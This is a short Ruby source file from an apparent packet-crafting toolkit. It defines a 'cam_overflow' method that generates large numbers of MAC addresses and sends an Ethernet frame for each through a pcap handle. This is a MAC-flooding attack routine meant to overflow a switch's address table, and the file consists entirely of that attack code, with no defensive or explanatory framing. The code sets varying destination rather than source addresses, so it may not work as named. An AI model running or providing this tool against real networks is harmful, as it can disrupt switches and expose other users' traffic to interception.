require_relative "../../protocol/ether_pac.rb"
require_relative "../../support/generator.rb"

class EtherP
	def self.cam_overflow(pcap, scale:256, mac_model:"\xb8\x76\x3f\x14\x5e\x33")
		pac = EtherP.new
		pac.etherh.protocol = "\x00\x00"

		Generator.generate_mac(scale, mac_model:mac_model) do|mac|
			pac.etherh.dst_mac = mac
			pcap.send_packet(pac.etherh.pack)
		end
	end
end